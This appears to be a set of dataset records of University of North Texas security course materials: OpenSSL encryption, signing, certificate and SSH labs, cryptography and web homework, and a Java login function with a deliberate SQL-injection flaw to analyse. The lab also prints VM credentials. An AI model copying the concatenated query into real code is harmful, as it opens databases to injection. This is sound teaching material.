OpenSSL (https://www.openssl.org/) is toolkit for the Transport Layer Security (TLS) protocol, and also a general-purpose cryptographic library. Its latest full-featured version OpenSSL 1.1.1 is installed on the VM.

Encryption and decryption is performed using “openssl enc” and “openssl dec” commands, respectively. You may type “man openssl” to learn more.

In your home directory, create a text file plaintext.txt and write a sentence “This is my secret message” into it (make sure to close the file). To confirm, type:
cat plaintext.txt

Q1: Attach a screenshot of the result.

Let us now encrypt this file using a password. Type:
openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.bin
The first option requests to use the AES-256 cipher in the counter (CTR) mode. The second option defined a password to be used for encryption, and the next option requests to use the PBKDF2 algorithm for generating a key from the password. 
In this exercise, for simplicity, use your EUID as a password (for example, if your EUID is “aa0001”, then the respective option will be written as “-pass pass:aa0001”). Note that in practice, such a password should never be used as it is very weak (i.e., too short and too easy to guess). The remaining options define the filenames for input (the plaintext) and output (the ciphertext).
Note: If the “-pass” option was not used, then utility would request the password to be entered manually (two times – the second one for confirmation).

Display the contents of the ciphertext file:
hexdump -C ciphertext.bin

Q2: Attach a screenshot of the result.

For decryption:
openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -d -in ciphertext.bin -out plaintext_dec.txt
Note: If the “-pass” option was not used, then utility would request the password to be entered manually.

To confirm, type:
cat plaintext_dec.txt

Note that the original messages have been decrypted.

Q3: Attach a screenshot of the result.

It is possible to encode the ciphertext using Base 64, in order to have it in the text format:
openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.txt

Type:
cat ciphertext.txt
Verify that decryption works correctly:
openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext.txt
Note: If the option “-out” is omitted, the standard output is used.

Q4: Attach a screenshot of the result.
Run the encryption again with the same password, but write the output into ciphertext2.txt:
openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext2.txt

Note that the decryption works correctly again:
openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext2.txt

Now, note that the ciphertexts are different. To verify, type:
cmp ciphertext.txt ciphertext2.txt
cat ciphertext.txt ciphertext2.txt

Q5: Explain why the ciphertexts in ciphertext.txt and ciphertext2.txt are different, even though the same password was used for encryption.
Hint: Run decryption of both files again, no adding the “-p” option.

Section 2: Public Key Encryption and Digital Signatures Using OpenSSL
Let us focus on the RSA algorithm in this section.

First, let us generate an RSA private key (effectively, we will generate the public/private key pair). Type:
openssl genrsa -out euid.key 3072
As usual, replace “euid” with your actual EUID.
This command generates the RSA private key and outputs it to the file euid.key. 
The key is stored in the PEM format. Display it:
cat euid.key
Next, we extract and display the public key:
openssl rsa -in euid.key -pubout -out euid_pk.key
cat euid_pk.key

Q6: Attach a screenshot of the result.

For encrypting the plaintext.txt, type:
openssl rsautl -encrypt -pubin -inkey euid_pk.key -in plaintext.txt -out rsa_ciphertext.bin

For decryption, type:
openssl rsautl -decrypt -inkey euid.key -in rsa_ciphertext.bin -out rsa_plaintext_dec.txt
cat rsa_plaintext_dec.txt

Q7: Attach a screenshot of the result.

Note: The above method is suitable for encryption of short messages (up to about 1 kilobyte), 
for longer messages a hybrid encryption (KEM/DEM) should be used.

To digitally sign the file plaintext.txt, type:
openssl dgst -sign euid.key -out sig.bin plaintext.txt
Note: As of the current version 1.1.1, OpenSSL signs messages directly when using the rsautl or pkeyutl commands. For this reason, it is simpler to deploy the dgst command, in order to hash and sign the message with one command.
Display the signature:
hexdump sig.bin

To verify the signature:
openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt

Q8: Attach a screenshot of the result.

Any changes in the message will invalidate the signature.
Let us replace the last letter in our message:
echo ""This is my secret messagd"" > plaintext.txt
cat plaintext.txt

Now, verification will fail:
openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt

Q9: Attach a screenshot of the result.


Section 3: Public Key Certificates Using OpenSSL
Let us now study handling of X.509 public key certificates using OpenSSL.
Suppose that we would like to create a certificate signing request (CSR) to the Certificate Authority for the RSA key that we generated earlier. The following command can be used (do not type it yet):

openssl req  -key euid.key -new -out euid_domain.csr

Then, the utility will request some additional information, which is called a Distinguished Name (DN). An important field in the DN is the Common Name (CN) —it should be the exact domain name of the host for which the certificate will be used. Below is an example of the prompt:

Country Name (2 letter code): The two-letter country code where your company/organization is legally located. Example: US
State or Province Name (full name): Example: Texas
Locality Name (e.g., city): Example: Denton
Organization Name (e.g., company): University of North Texas
Organizational Unit Name (e.g., section): Department of Computer Science and Engineering (this field is optional)
Common Name (e.g. server FQDN): Fully Qualified Domain Name; Example: www.unt.edu
Email Address: Example: webmaster@unt.edu (this field is optional)

It is possible to enter all of the above information from the command line as described below.

Type: 
openssl req -key euid.key -new -out euid_domain.csr \
-subj ""/C=US/ST=Texas/L=Denton/O=UNT/OU=CSE/CN=www.euid.edu""

Let us verify the result:
openssl req -text -in euid_domain.csr -noout -verify

Q10: Attach a screenshot of the result.


Note: The CSR file “euid_domain.csr” will need to be sent to CA that will check the user information. If the check is successful, CA will issue the certificate file. We will omit this step in this lab. Instead, we will obtain and verify the certificate of the Google webserver. For that, we will use the s_client program (of the OpenSSL suite) which implements a generic SSL/TLS client. 

Type:
openssl s_client -connect google.com:443 </dev/null

Note: The redirection from the null device immediately closes the s_client program, as in general it expects commands to establish the TLS connection. 

In order to display the whole certificate chain, type:
openssl s_client -connect google.com:443 -showcerts </dev/null

Since the output of the previous command takes several screens to be display, making a picture of the last screen may not be very informative. The “more” command will be helpful in this case. Type:
openssl s_client -connect google.com:443 -showcerts </dev/null | more
Note: Scrolling is done by pressing “Space” to advance the whole screen down, or “Enter” to advance one line. 

Q11: Attach two screenshots: The first and the last screen displayed as a result of the above command.

Section 4: SSH Authentication Using Public Keys
OpenSSH can use public key cryptography for authentication. We will use a freshly generated RSA key pair. Note that if you already have a generated key, you may use the ssh-keygen command with “-i” option and then specify the key file name.
Important note: In this lab, we will use the earlier generated key pair, only to demonstrate the conversion of key formats.

Type:
ssh-keygen -t rsa
Note: You will see the following prompts—you may just press “Enter” for all of them—and the following messages will be displayed:

Enter file in which to save the key (/home/sec-lab/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/sec-lab/.ssh/id_rsa
Your public key has been saved in /home/sec-lab/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:lsfwRd7HQmfPZ+rjQOGjLkyr+M67/xImKZRtVD31T9s sec-lab@vm1

(Note: The above value and the below randomart image will be different each time for each student. The “randomart” image is a visualization of the SHA256 hash value to make it easier to compare.)

The key's randomart image is:
+---[RSA 3072]----+
|       ... .o . o|
|      .   oo + =.|
|     +  .  .+ + O|
|    o o  = o . B+|
|   . . .S + + ..E|
|    . o.+. o o   |
|     . = o. . o  |
|     o  =.   o . |
|    .oB=.+o   .  |
+----[SHA256]-----+

Q12: Attach a screenshot of the result.

Let us verify the result:
ls ~/.ssh/
You may expect to see two files: id_rsa and id_rsa.pub, which should contain the private and public keys, respectively.

Let us try to establish an SSH connection (for simplicity, we will connect to our own host):
ssh localhost
The SSH server will request a password. Press “Control+Z” to escape. Suppose that we want to allow trusted users to access our host without entering a password. Such a user needs to possess a private key corresponding to the public key communicated to the server in a trusted manner. Such the public key are called “authorized keys”. 

Designate your public key as the OpenSSH authorized key as follows:
cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys

This should allow us to establish an SSH connection (to our own host) without the use of passwords:
ssh localhost   (if the prompt about adding to the known hosts appears, then accept it)
(If successful, a welcome message will be displayed.)
Close the SSH connection:
exit

Q13: Attach a screenshot of the result.


References:
OpenSSL version 1.1.1 manual: https://www.openssl.org/docs/man1.1.1/
OpenSSL Cookbook, 3ed online: https://www.feistyduck.com/library/openssl-cookbook/online/
OpenSSL Quick Reference Guide:
https://www.digicert.com/kb/ssl-support/openssl-quick-reference-guide.htm
M. Anicas: OpenSSL Essentials: Working with SSL Certificates, Private Keys and CSRs: https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs
Wikibook on OpenSSH/Cookbook/Public Key Authentication: https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Public_Key_Authentication
"
"['file', 'program', 'sensitive.txt', 'checksum', 'key', 'attach a screenshot', 'write', 'attach', 'result', 'encrypted file', 'terminal window', 'run the program', 'write a program', 'terminal', 'keyed', 'observe the result', 'window', 'run', 'command', 'homework', 'directory', 'screenshot', 'cryptography', 'display', 'encrypted']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Cryptography 4,Homework,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 3: Cryptography
Homework 3: Cryptography
Due on Nov 13 at 11:59pm
Grading Rubric: Q0 is worth 5 points. Q1-Q7 are worth 15 points each. 
Total: 110 points (the actual grade will not exceed 100 points).
Submission Guide: You must submit the homework assignment (in PDF) and all the 
created code and executables.
For this homework, use the same virtual machine (VM) as for your project.
IMPORTANT NOTE: Before starting this assignment, you must customize your 
command prompt as described in the Command Prompt Customization Manual. 
This customization manual directs you to place your EUID (Enterprise User ID) into 
the command prompt. Submissions which do not comply with this requirement will 
receive no credit.
Introduction
In this homework, you will write programs which perform public-key encryption and compute 
cryptographic checksums (keyless and keyed). You may use any programming language in this 
assignment. We recommend you choose the same one as for the project “Ransomware”. 
Some of the components created in this homework may be re-purposed for your project.
Section 1: Public-key encryption
1. Create a directory “hw3”. Download a file “sensitive.txt” from the assignment page and copy it 
into the directory “hw3”.
2. Write a program “generate_keys”. This program will randomly generate a pair of 3072-bit RSA 
keys and then it will save the public key into a file “pub_key” and the private key into a file 
“priv_key”.
Q0: What programming language did you use? What cryptographic library did you use?
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 3: Cryptography
In the terminal window, run the program “generate_keys”. Then, display the files “pub_key” 
and “priv_key” using the “hexdump” command.
Q1: Attach a screenshot of the result.
3. Write a program “encrypt_file”. This program will encrypt a file “sensitive.txt” in the directory 
“hw3” on the key “pub_key”. The key will be read from the file “pub_key”. The encrypted file 
will overwrite the original file “sensitive.txt”.
Make sure that the original (unencrypted) file “sensitive.txt” is placed into the directory “hw3”. 
In the terminal window, display the first 100 bytes of the original (unencrypted) file 
“sensitive.txt” using the “head” command. Run the program “encrypt_file”. Display the first 
100 bytes of the encrypted file “sensitive.txt” using the “hexdump” command.
Q2: Attach a screenshot(s) of the result. Make sure that both original (unencrypted) and 
encrypted versions of the file are displayed on the screenshots.
4. Write a program “decrypt_file”. This program will decrypt the file “sensitive.txt” in 
the directory “hw3” using the key “priv_key”. The key will be read from the file “priv_key”. 
The decrypted file will overwrite the encrypted file “sensitive.txt”.
Make sure that the encrypted file “sensitive.txt” is in the directory “hw3”. In the terminal 
window, display the first 100 bytes of the encrypted file “sensitive.txt” using the “hexdump”
command. Run the program “decrypt_file”. Display the first 100 bytes of the decrypted file 
“sensitive.txt” using the “head” command.
Q3: Attach a screenshot(s) of the result. Make sure that both encrypted and decrypted versions of 
the file are displayed on the screenshots.
5. Write a program “compute_checksum” which computes a keyless cryptographic checksum of 
a file “sensitive.txt”. You will use a hash function SHA256 compute it.
The checksum will be written into a file “sensitive_checksum.txt”—this file should be in 
the text format.
Copy the original (unencrypted) file “sensitive.txt” into the directory “hw3”.
In the terminal window, run the program “compute_checksum”. Display the checksum:
cat sensitive_checksum.txt 
Q4: Attach a screenshot of the result. 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 3: Cryptography
6. Write a program “verify_checksum” which works as follows: it computes a checksum of 
“sensitive.txt” and compares it with the contents of “sensitive_checksum.txt”. 
If the resulting hash values are the same, then the program outputs “Accept!” and otherwise it 
outputs “Reject!”.
In the terminal window, run the program “verify_checksum”. (Observe the result.)
Change the first symbol in “sensitive.txt” to a different symbol, and save the file.
Come back to the terminal window and run the program “verify_checksum”.
(Observe the result.)
Q5: Attach a screenshot of the result.
7. Write a program “compute_keyed_checksum” which works similarly to the one in Step 4, but 
instead of SHA256, you will use the keyed hash function HMAC-SHA256. A 256-bit key will 
be read from the file “key.bin”. The checksum will be written into a file 
“sensitive_keyed_checksum.txt”—this file should be in the text format.
Generate a random key:
head -c 256 /dev/urandom > key.bin
Copy the original (unencrypted) file “sensitive.txt” into the directory “hw3”.
In the terminal window, run the program “compute_keyed_checksum”. Display the checksum:
cat sensitive_keyed_checksum.txt
Q6: Attach a screenshot of the result.
8. Write a program “verify_keyed_checksum” which works as follows: 
it computes a keyed checksum of “sensitive.txt” using HMAC-SHA256 and compares it with 
the contents of “sensitive_keyed_checksum.txt”. If the resulting values are the same, then 
the program outputs “Accept!” and otherwise it outputs “Reject!”.
In the terminal window, run the program “verify_keyed_checksum”. (Observe the result.)
Change the first symbol in “sensitive.txt” to a different symbol, and save the file.
Come back to the terminal window and run the program “verify_checksum”.
(Observe the result.)
Q7: Attach a screenshot of the result."
"['openssl', 'key', 'public key', 'attach a screenshot', 'lab', 'rsa', 'euid', 'cryptography lab', 'attach', 'rsa key', 'note', 'pass pass', 'type', 'pass', 'ssh', 'public', 'public key certificates', 'password', 'rsa private key', 'screenshot', 'openssl enc', 'result', 'csce', 'fall', 'private key']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Cryptography 5,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
Lab 5a: Cryptography
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
The learning objective of this lab is for students to get some hands-on experience with the basic 
cryptographic primitives: symmetric encryption, public-key encryption, and digital signatures.
Also, they will get familiar with two popular applications: public-key certificates, and SSH 
authentication. This lab is mainly based on OpenSSL (https://www.openssl.org/)—a toolkit for 
the Transport Layer Security (TLS) protocol, and also a general-purpose cryptographic library. 
Its full-featured version OpenSSL 1.1.1 is installed on the VM.
Section 1: Symmetric Encryption using OpenSSL
In this section, let us work with the AES cipher (symmetric encryption algorithm). In OpenSSL, 
encryption and decryption is performed using “openssl enc” and “openssl dec” commands, 
respectively. You may type “man openssl” to learn more.
1. In your home directory, create a text file plaintext.txt and write a sentence “This is my secret 
message” into it (make sure to close the file). To confirm, type:
cat plaintext.txt
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
Q1: Attach a screenshot of the result.
2. Let us now encrypt this file using a password. Read the below explanation first, and then type:
openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.bin
The first option requests to use the AES-256 cipher in the counter (CTR) mode. The second 
option defined a password to be used for encryption, and the next option requests to use 
the PBKDF2 algorithm for generating a key from the password. 
In this exercise, for simplicity, use your EUID as a password (for example, if your EUID is 
“aa0001”, then the respective option will be written as “-pass pass:aa0001”). Note that in 
practice, such a password should never be used as it is very weak (i.e., too short and too easy to 
guess). The remaining options define the filenames for input (the plaintext) and output 
(the ciphertext).
Note: If the “-pass” option was not used, then utility would request the password to be entered 
manually (two times – the second one for confirmation).
3. Display the contents of the ciphertext file:
hexdump -C ciphertext.bin
Q2: Attach a screenshot of the result.
4. For decryption:
openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -d -in ciphertext.bin -out plaintext_dec.txt
Note: If the “-pass” option was not used, then the utility would request the password to be 
entered manually.
5. To confirm, type:
cat plaintext_dec.txt
Note that the original message has been decrypted.
Q3: Attach a screenshot of the result.
6. It is possible to encode the ciphertext using Base64, in order to have it in the text format:
openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.txt
7. Type:
cat ciphertext.txt
8. Verify that decryption works correctly:
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext.txt -out plaintext_dec2.txt
Note: If the option “-out” is omitted, the standard output is used.
Q4: Attach a screenshot of the result.
9. Run the encryption again with the same password, but write the output into ciphertext2.txt:
openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext2.txt
10. Note that the decryption works correctly again:
openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext2.txt
11. Now, note that the ciphertexts are different. To verify, type:
cat ciphertext.txt ciphertext2.txt
Q5: Explain why the ciphertexts in ciphertext.txt and ciphertext2.txt are different, even though 
the same password was used for encryption.
Hint: Run decryption of both files again, but now add the “-p” option to the original command.
Section 2: Public Key Encryption and Digital Signatures Using OpenSSL
Let us focus on the RSA algorithm in this section.
1. First, let us generate an RSA private key (effectively, we will generate the public/private key 
pair). Type:
openssl genrsa -out euid.key 3072
As usual, replace “euid” with your actual EUID.
This command generates the RSA private key and outputs it to the file euid.key. 
The key is stored in the PEM format. Display it:
cat euid.key
2. Next, we extract and display the public key:
openssl rsa -in euid.key -pubout -out euid_pk.key
cat euid_pk.key
Q6: Attach a screenshot of the result. What security level does 3072-bit RSA key offer?
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
3. For encrypting the plaintext.txt, type:
openssl rsautl -encrypt -pubin -inkey euid_pk.key -in plaintext.txt -out rsa_ciphertext.bin
4. For decryption, type:
openssl rsautl -decrypt -inkey euid.key -in rsa_ciphertext.bin -out rsa_plaintext_dec.txt
cat rsa_plaintext_dec.txt
Q7: Attach a screenshot of the result.
Note: The above method is suitable for encryption of short messages (up to about 1 kilobyte), 
for longer messages a hybrid encryption (KEM/DEM) should be used.
5. To digitally sign the file plaintext.txt, type:
openssl dgst -sign euid.key -out sig.bin plaintext.txt
Note: As of version 1.1.1, OpenSSL signs messages directly when using the rsautl or pkeyutl
commands. For this reason, it is simpler to deploy the dgst command, in order to hash and sign 
the message with one command.
Display the signature:
hexdump sig.bin
6. To verify the signature:
openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt
Q8: Attach a screenshot of the result.
7. Any changes in the message will invalidate the signature.
Let us replace the last letter in our message:
echo ""That is my secret message"" > plaintext.txt
cat plaintext.txt
8. Now, verification will fail:
openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt
Q9: Attach a screenshot of the result.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
Section 3: Public Key Certificates Using OpenSSL
Let us now study handling of X.509 public key certificates using OpenSSL.
Suppose that we would like to create a certificate signing request (CSR) to the Certificate Authority for 
the RSA key, which we generated earlier. The following command can be used (do not type it yet):
openssl req -key euid.key -new -out euid_domain.csr
Then, the utility will request some additional information, which is called a Distinguished Name (DN).
An important field in the DN is the Common Name (CN) —it should be the exact domain name of the 
host for which the certificate will be used. Below is an example of the prompt:
Country Name (2 letter code): The two-letter country code where your company/organization is legally 
located. Example: US
State or Province Name (full name): Example: Texas
Locality Name (e.g., city): Example: Denton
Organization Name (e.g., company): University of North Texas
Organizational Unit Name (e.g., section): Department of Computer Science and Engineering (this field 
is optional)
Common Name (e.g. server FQDN): Fully Qualified Domain Name; Example: www.unt.edu
Email Address: Example: webmaster@unt.edu (this field is optional)
It is possible to enter all of the above information from the command line as described below.
1. Type:
openssl req -key euid.key -new -out euid_domain.csr \
-subj ""/C=US/ST=Texas/L=Denton/O=UNT/OU=CSE/CN=www.euid.edu""
2. Let us verify the result:
openssl req -text -in euid_domain.csr -noout -verify
Q10: Attach a screenshot of the result.
Note: The CSR file “euid_domain.csr” will need to be sent to CA that will check the user information. 
If the check is successful, CA will issue the certificate file. We will omit this step in this lab. Instead, 
we will obtain and verify the certificate of the Google webserver. For that, we will use the s_client
program (of the OpenSSL suite) which implements a generic SSL/TLS client. 
3. Type:
openssl s_client -connect google.com:443 </dev/null
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
Note: The redirection from the null device immediately closes the s_client program, as in 
general it expects commands to establish the TLS connection. 
4. In order to display the whole certificate chain, type:
openssl s_client -connect google.com:443 -showcerts </dev/null
5. Since the output of the previous command takes several screens to be display, making a picture 
of the last screen may not be very informative. The “more” command will be helpful in this 
case. Type:
openssl s_client -connect google.com:443 -showcerts </dev/null | more
Note: Scrolling is done by pressing “Space” to advance the whole screen down, or “Enter” to 
advance one line. 
Q11: Attach two screenshots: The first and the last screen displayed as a result of the above 
command.
Section 4: SSH Authentication Using Public Keys
OpenSSH can use public key cryptography for authentication. We will use a freshly generated RSA key 
pair. (Remark: We could have also used the RSA key from the previous steps, but we will not do it in 
this lab.)
1. Type:
ssh-keygen -t rsa
Note: You will see the following prompts—you may just press “Enter” for all of them—and the 
following messages will be displayed:
Enter file in which to save the key (/home/sec-lab/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/sec-lab/.ssh/id_rsa
Your public key has been saved in /home/sec-lab/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:lsfwRd7HQmfPZ+rjQOGjLkyr+M67/xImKZRtVD31T9s sec-lab@vm1
(Note: The above value and the below “randomart” image will be different each time for each 
student. The randomart image is a visualization of the SHA256 hash value to make it easier to 
compare.)
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
The key's randomart image is:
+---[RSA 3072]----+
| ... .o . o|
| . oo + =.|
| + . .+ + O|
| o o = o . B+|
| . . .S + + ..E|
| . o.+. o o |
| . = o. . o |
| o =. o . |
| .oB=.+o . |
+----[SHA256]-----+
Note: In practice, the passphrase should be chosen as a secure password in order to restrict 
usage of the private key. In this lab, we use an empty password for simplicity.
Q12: Attach a screenshot of the result.
2. Let us verify the result:
ls ~/.ssh/
You may expect to see two files: id_rsa and id_rsa.pub, which should contain the private and 
public keys, respectively.
3. Let us try to establish an SSH connection (for simplicity, we will connect to our own host):
ssh localhost
The SSH server will request a password. Press “Control+Z” to escape. Suppose that we want to 
allow trusted users to access our host without entering a password. Such a user needs to possess 
a private key corresponding to the public key communicated to the server in a trusted manner. 
Such the public keys are called “authorized keys”. 
4. Designate your public key as the OpenSSH authorized key as follows:
cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
5. This should allow us to establish an SSH connection (to our own host) without the use of 
passwords:
ssh localhost // if the prompt about adding to the known hosts appears, then accept it
(If successful, a welcome message will be displayed.)
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Cryptography Lab
Close the SSH connection:
exit
Q13: Attach a screenshot of the result.
References:
1. OpenSSL version 1.1.1 manual: https://www.openssl.org/docs/man1.1.1/
2. OpenSSL Cookbook, 3ed online: https://www.feistyduck.com/library/openssl-cookbook/online/
3. OpenSSL Quick Reference Guide:
https://www.digicert.com/kb/ssl-support/openssl-quick-reference-guide.htm
4. M. Anicas: OpenSSL Essentials: Working with SSL Certificates, Private Keys and CSRs: 
https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-sslcertificates-private-keys-and-csrs
5. Wikibook on OpenSSH/Cookbook/Public Key Authentication: 
https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Public_Key_Authentication"
"['euid', 'php page', 'data', 'database', 'html', 'homework', 'html page', 'page', 'php', 'xml', 'xml document', 'database table', 'add css', 'actual euid', 'add', 'css', 'march', 'friday', 'file', 'search', 'document', 'homework assignment', 'table', 'form data', 'cse']",The University of North Texas,SECURE ECOMMERCE,5560,"CSS, XML, Database ",Homework,"Homework 3
		Due: 11:59 PM on Friday, March 4, 2022.

In this homework assignment, you will take and modify your Homework 2 assignment to add CSS, XML, and database capabilities. Unless so indicated, all requirements in Homework 2 hold in Homework 3, but note that there are some required modifications in this assignment.
All student databases should now be created and are accessible using your EUID. You should follow the remaining instructions in the “Installing phpMyAdmin.pdf” document and ensure you have database access. Again, please make sure to follow these instructions exactly as specified and not explicitly add other elements or features.
Use a Database Instead of Flat-File System
You will manually create a table in your database through the phpMyAdmin interface that supports all of the fields in your HTML form. Then on your original form data for your submit button, instead of writing the information to the <EUID>.txt file, you will insert the data into that table in your database. As a result, you will no longer need the <EUID>.txt file, so that functionality (reading from and writing to the <EUID>.txt file) is no longer needed for this assignment. Note that you may need to slightly modify your data to support a primary key, but all data must be validated. This means that you should not only verify that the user did not leave any fields blank, but also that all data are of the expected and proper format to be inserted into your database (e.g., age should not be negative, etc.). You will then display an error message with a link back to the <EUID>.html page as before if there are any blank fields or invalid data.
On your <EUID>.php page, instead of writing the new input data to the file and displaying all of the historical data to the page, you will now simply indicate whether or not the new data was successfully added and then, if successful, display the data for the new record only. At the bottom of the <EUID>.php page, you will provide the link for the user to go back to the <EUID>.html page.
Add New Search Functionality
On your <EUID>.html page, you will add a search button plus a text field for the user to enter search information. This form data will be sent to your <EUID>.php page that will search your database table for matching information based on your primary key.
You will need to modify your <EUID>.php page so that if the search button was clicked, you will search the database table for the data and display the entire record if found. If the record is not found, you will indicate that no matching record was found. At the bottom of the <EUID>.php page, you will provide the link for the user to go back to the <EUID>.html page.
Read an XML document and Update the Database
XML is used to structure, store, and transport data from one system to another. Using an editor, you will manually create an XML document called <EUID>.xml, where <EUID> should be replaced with your actual EUID. Your XML document will contain tags supporting your form data and be populated with two complete entries. Again, you will manually create this document.
Then, you want to modify your <EUID>.php page to read the <EUID>.xml document and insert the two records into your database table. However, keep in mind that this data should only be read in once. As a hint, if the data already exists in the database table, you should not attempt to insert again.
Add CSS to your HTML documents
You will add CSS to your HTML and/or PHP documents using a <link> element to link to an external CSS file called <EUID>.css, where <EUID> should be replaced with your actual EUID. Note that you should not add CSS using inline or internal methods – external only.
You will add a minimum of 4 rules (i.e., 4 selectors) with at least 2 property-value combinations for each rule. For example, the following is 1 rule with 2 property-value combinations:
p {
	font-family: ""sans serif"";
	color: red;
}
You may add more rules and property-value combinations as you wish for your desired effect on your web page.
REQUIREMENTS:
You are to write the HTML, PHP, and XML code solely on your own, without the aid of web page development software (e.g., WordPress, Drupal, etc.) on our Linux CSE servers (e.g., cse01, cse02, …, cse06) or Internet solutions. Points may be deducted for submissions found to contain HTML or PHP code automatically generated or from other sources.
You will have to install phpMyAdmin on the Linux CSE server following all steps in the ""Installing phpMyAdmin.pdf"" file on Canvas for this activity.
Your HTML and PHP code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and brief description), comments for each variable, and commented blocks of code.
Your scripts will be graded based largely on whether it works correctly on the CSE machines, so you should make sure that your scripts do not have any runtime errors and runs on a CSE machine.
If you have any questions about what is expected, please contact your instructor or TA assigned to this course to ensure you understand these directions.
This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of “F” for the course, along with a report filed into the Academic Integrity Database.

SUBMISSION:
You will electronically submit your files in a ZIP folder to the Homework 3 dropbox in Canvas by the due date and time. Please also include the URL and any instructions in a README file to Canvas."
"['class on tuesday', 'points', 'due', 'march', 'tuesday', 'class', 'national vulnerability database', 'vulnerability', 'describe', 'answer', 'owasp top', 'homework', 'words', 'review', 'cia triad', 'select', '11:30', 'vulnerability database', 'national vulnerability', 'unt', 'briefly explain', 'compromise', 'sop', 'compromise in integrity', 'attack']",The University of North Texas,SECURE ECOMMERCE,5560,Cybersecurity Attacks 1,Homework,"Homework 4
Due: 11:30 AM  BEFORE CLASS on Tuesday, March 8, 2022.
Please answer in your own words and show any and all work.

(20 points) Answer the following questions relating to the CIA triad:
Describe an example where a compromise in confidentiality can lead to a compromise in integrity.



Identify and describe what security classification property that e-mail spam violates.



(20 points) Although there are legal requirements for reporting certain cyber attacks (e.g., when customer sensitive data is breached), briefly explain why an e-commerce site might not want to disclose that it is a victim of a cyber attack?




(20 points) Review the OWASP Top 10 security vulnerabilities for 2021 and select one of the identified vulnerabilities. Then write one paragraph describing the vulnerability, at least one prevention technique, and example attack scenario in your own words.



(20 points) Review some of the recent software flaws (CVE) from the last 3 months on the National Vulnerability Database (https://nvd.nist.gov/vuln/search). Select one of the many available (hopefully, different than other students might select) and provide a brief one-paragraph synopsis on the vulnerability and any resolutions or prevention techniques associated with the vulnerability in your own words.


(20 points) Suppose that UNT already has existing services at https://unt.edu, such as https://unt.edu/academics. Now UNT would like to add a new service for students to create websites as https://untsites.edu/[NAME], where [NAME] is some user’s name such as james. This service would allow you to choose your own NAME and upload any HTML document or script that you’d like.
Consider the same-origin policy (SOP) and briefly explain why this option would be a generally better plan than simply allowing users to put websites on https://unt.edu/sites/[NAME]?




Unfortunately, the https://untsites.edu/[NAME] solution can still be attacked. Again, with SOP in mind, describe the limitation to this design and suggest a possible solution to address this issue.



"
"['buffer overflow', 'string uname', 'string passwd', 'string query', 'string', 'april', 'points', 'friday', 'password', 'buffer', 'overflow', 'result object', 'select userid', 'src', 'code', 'connect conn', 'login', 'result', 'java code', 'function', 'url', 'xss', 'buffer overflow attacks', 'client login section']",The University of North Texas,SECURE ECOMMERCE,5560,Cybersecurity Attacks 2,Homework,"Homework 5
Due: 11:59 PM on Friday, April 8, 2022
Please answer in your own words and show any and all work.

(33 points) You somehow discover the following Java code in the client login section for your online banking website:
ResultSet login(Connect conn, String uname, String passwd)
throws SQLException
{
String query = ""SELECT userID FROM Customers WHERE username = ’""
	+ uname + ""' AND password = md5('"" + passwd + ""');"";
Statement state = conn.createStatement();
return state.executeQuery(query);
}

md5 is a hash function that creates an MD5 hash of the password. For the purposes of this problem, you can simply treat this function as simply scrambling the user’s password into a format that is stored in the database. You do not need to worry about the details of how this is done.
